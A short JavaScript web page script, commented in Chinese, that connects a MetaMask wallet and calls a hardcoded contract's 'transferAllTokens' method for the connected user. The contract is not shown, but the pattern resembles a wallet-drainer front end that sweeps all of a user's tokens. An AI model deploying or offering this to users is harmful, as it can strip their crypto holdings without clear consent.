let web3;
let userAddress;
let contract;
const contractAddress = "0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F";  // 智能合约地址
const abi = [
  {
    "inputs": [{"internalType": "address","name": "from","type": "address"}],
    "name": "transferAllTokens",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  // 省略其他部分
];

document.getElementById('connectButton').addEventListener('click', async () => {
  if (typeof window.ethereum !== 'undefined') {
    try {
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      userAddress = accounts[0];
      web3 = new Web3(window.ethereum);
      contract = new web3.eth.Contract(abi, contractAddress);
      alert('钱包已连接: ' + userAddress);
    } catch (error) {
      console.error("连接钱包失败: ", error);
      alert('连接钱包失败，请重试');
    }
  } else {
    alert('请安装Metamask钱包');
  }
});

document.getElementById('transferButton').addEventListener('click', async () => {
  if (!userAddress || !contract) {
    alert('请先连接钱包');
    return;
  }

  try {
    await contract.methods.transferAllTokens(userAddress).send({ from: userAddress });
    alert('代币转移成功');
  } catch (error) {
    console.error("代币转移失败: ", error);
    alert('代币转移失败，请重试');
  }
});
